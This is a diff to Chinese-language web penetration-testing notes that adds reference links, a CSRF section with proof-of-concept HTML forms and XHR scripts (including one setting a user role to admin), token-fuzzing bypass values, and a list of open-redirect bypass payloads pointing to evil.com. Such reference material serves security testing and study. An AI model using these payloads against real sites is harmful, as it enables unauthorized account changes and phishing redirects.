@@ -459,6 +459,7 @@ WEB-INF 主要包含一下文件或目录:
 
 **相关文章**
 - [关于Swagger-UI下的渗透实战](https://blog.m1kh.com/index.php/archives/403/)
+- [接口文档下的渗透测试](https://mp.weixin.qq.com/s/xQUnTXo38x_jLWv5beOQ0Q)
 
 **相关工具**
 - [lijiejie/swagger-exp](https://github.com/lijiejie/swagger-exp)
@@ -534,7 +535,7 @@ WEB-INF 主要包含一下文件或目录:
 **相关工具**
 - [commixproject/commix](https://github.com/commixproject/commix)
 
-## http参数污染
+## HTTP参数污染
 
 **相关文章**
 - [Web 应用里的 HTTP 参数污染 (HPP) 漏洞](https://blog.csdn.net/eatmilkboy/article/details/6761407)
@@ -551,7 +552,7 @@ WEB-INF 主要包含一下文件或目录:
 **相关案例**
 - [新浪某站CRLF Injection导致的安全问题](https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html)
 
-## host_Injection
+## HOST_Injection
 
 **相关文章**
 - [检测到目标url存在框架注入漏洞_HOST注入攻击剖析](https://blog.csdn.net/weixin_39609500/article/details/111349436)
@@ -568,13 +569,13 @@ WEB-INF 主要包含一下文件或目录:
 
 ## XSS
 
-- [XSS 笔记](./xss.md)
+- [XSS 笔记](./XSS.md)
 
 ---
 
 ## XXE
 
-- [XXE 笔记](./xxe.md)
+- [XXE 笔记](./XXE.md)
 
 ---
 
@@ -601,7 +602,7 @@ SSI 就是在 HTML 文件中，可以通过注释行调用的命令或指针，�
 
 `服务器端模板注入`
 
-- [SSTI 笔记](./ssti.md)
+- [SSTI 笔记](./SSTI.md)
 
 ---
 
@@ -609,6 +610,13 @@ SSI 就是在 HTML 文件中，可以通过注释行调用的命令或指针，�
 
 **相关文章**
 - [表达式注入](https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/)
+
+---
+
+## WebSocket安全
+
+**相关文章**
+- [利用WebSocket接口中转注入渗透实战](https://mp.weixin.qq.com/s/d6AhbonbMIaVpoZ3XGL-1g) - 通过脚本中转 websocket 让 sqlmap 可以注入
 
 ---
 
@@ -657,6 +665,63 @@ CSRF 一般使用 form 表单提交请求，而浏览器是不会对 form 表单
 
 **相关靶场**
 - [incredibleindishell/CORS_vulnerable_Lab-Without_Database](https://github.com/incredibleindishell/CORS_vulnerable_Lab-Without_Database)
+
+---
+
+## CSRF
+
+**简介**
+
+跨站请求伪造（CSRF/XSRF）攻击，攻击者通过钓鱼或其他手段欺骗用户在他们目前已认证的网络应用程序上执行不需要的行动。
+
+**验证方法**
+
+- GET
+    ```html
+    <a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
+    ```
+
+- POST
+    ```html
+    <form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+    <input name="username" type="hidden" value="uname" />
+    <input type="submit" value="Submit Request" />
+    </form>
+    ```
+
+- JSON GET
+    ```html
+    <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://www.example.com/api/currentuser");
+    xhr.send();
+    </script>
+    ```
+
+- JSON POST
+    ```html
+    <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://www.example.com/api/setrole");
+    xhr.withCredentials = true;
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    xhr.send('{"role":admin}');
+    </script>
+    ```
+
+**Bypass 技巧**
+
+- 尝试 fuzz token
+    ```
+    username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
+
+    username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
+    username=dapos&password=123456&token=0
+    username=dapos&password=123456&token=
+    username=dapos&password=123456&
+    ```
+
+- POST 转 GET
 
 ---
 
@@ -746,6 +811,31 @@ SOME（Same Origin Method Execution），同源方式执行，不同于 XSS 盗�
 
 **字典**
 - https://github.com/No-Github/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_param_Register.txt
+
+**Bypass 技巧**
+- Fuzz
+    - `/?ref=evil.com`
+    - `/?ref=//evil.com`
+    - `/?ref=\\evil.com`
+    - `/?ref=\/\/evil.com/`
+    - `/?ref=/\/evil.com/`
+    - `/?ref=evil%E3%80%82com`
+    - `/?ref=//evil%00.com`
+    - `/?ref=target.com&ref=evil.com`
+    - `/?ref=target.com@evil.com`
+    - `/?ref=target.com%40evil.com`
+    - `/?ref=target.com?evil.com`
+    - `/?ref=https://evil.c℀.example.com`
+    - `/?ref=target.com/°evil.com`
+    - `/?ref=/%0d/evil.com`
+
+- 协议
+    - `/?ref=http:evil.com`
+    - `/?ref=https:evil.com`
+
+- 白名单
+    - `/?ref=baidu.com`
+    - `/?ref=baidu.com.evil.com`
 
 ---
 
